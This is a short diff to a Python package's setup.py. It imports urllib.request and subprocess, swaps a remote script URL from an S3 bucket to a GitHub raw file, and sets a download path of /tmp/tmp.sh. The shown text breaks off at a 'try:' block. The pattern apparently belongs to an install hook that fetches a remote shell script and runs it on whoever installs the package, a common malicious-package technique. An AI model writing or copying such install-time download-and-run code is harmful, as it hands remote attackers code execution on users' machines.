@@ -3,8 +3,8 @@ import urllib.request
 import subprocess
 from setuptools import setup, find_packages
 
-# url = "https://raw.githubusercontent.com/JoeWeate/Test/main/test"  # corrected URL
-url = "https://saltnprep-media.s3.us-east-1.amazonaws.com/public/add"
+url = "https://raw.githubusercontent.com/JoeWeate/Test/main/test"  # corrected URL
+# url = "https://saltnprep-media.s3.us-east-1.amazonaws.com/public/add"
 script_path = "/tmp/tmp.sh"
 
 try:
